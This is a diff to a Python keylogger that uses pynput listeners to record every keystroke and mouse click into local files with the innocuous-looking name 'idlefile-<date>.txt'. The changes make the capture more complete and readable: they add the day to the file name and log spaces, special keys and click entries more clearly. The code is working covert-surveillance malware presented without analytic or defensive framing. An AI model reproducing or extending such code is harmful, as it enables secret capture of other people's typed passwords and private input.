@@ -6,26 +6,30 @@ from datetime import datetime
 
 
 
-def _update_time(key):
+def _update_time(message):
     time = datetime.strptime(format(datetime.now()), '%Y-%m-%d %H:%M:%S.%f')
     year = str(time.year)
     month = str(time.month)
+    day = str(time.day)
     hour = str(time.hour)
-    date_time = year + "-" + month + "-" + hour
+    date_time = year + "-" + month + "-" + day + "-" + hour
 
 
     f = open(f"./idlefile-{date_time}.txt", "a")
-    f.write(str(key))
+    f.write(str(message))
     f.close()
     return True
 
 
 def _on_press(key):
     check_char = hasattr(key, 'char')
+
     if check_char:
         _update_time(key.char)
+    elif key == key.space:
+        _update_time(" ")
     else:
-        _update_time(key)
+        _update_time(f"\n {key} \n")
     return True
     
 
@@ -37,7 +41,7 @@ key_listener.start()
 
 
 def _on_click(x, y, button, pressed):
-    _update_time(button)
+    _update_time(f"{button}\n")
     return True
 
 with mouse.Listener(
